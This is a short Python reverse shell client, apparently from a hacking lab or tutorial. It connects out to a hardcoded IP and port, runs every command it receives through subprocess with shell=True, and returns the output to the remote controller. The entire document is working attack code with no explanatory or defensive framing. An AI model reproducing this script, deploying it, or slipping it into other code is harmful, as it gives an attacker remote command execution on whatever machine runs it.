#!/usr/bin/python

import socket
import subprocess

def shell():
    while True:
        command = sock.recv(1024)
        if command == 'q':
            break
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            sock.send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.2.15",54321))#Change to Server IP

shell()

sock.close()
